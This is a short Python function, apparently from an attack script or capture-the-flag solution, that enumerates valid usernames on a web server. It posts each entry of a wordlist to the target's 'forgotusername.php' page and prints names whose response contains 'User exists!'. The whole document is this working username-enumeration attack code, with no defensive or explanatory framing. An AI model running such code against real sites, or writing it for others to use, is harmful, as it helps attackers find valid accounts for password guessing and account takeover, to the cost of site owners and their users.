def userEnum(ip, wordlist):
	s = requests.session()
	target = "http://%s/forgotusername.php" % ip
	with open(wordlist, "r") as wordlist:
		for user in wordlist:
			user = user.strip()
			data = {'username': user}
			req = s.post(target, data=data)
			res = req.text
			if "User exists!" in res:
				print("[+] Username found:", user)
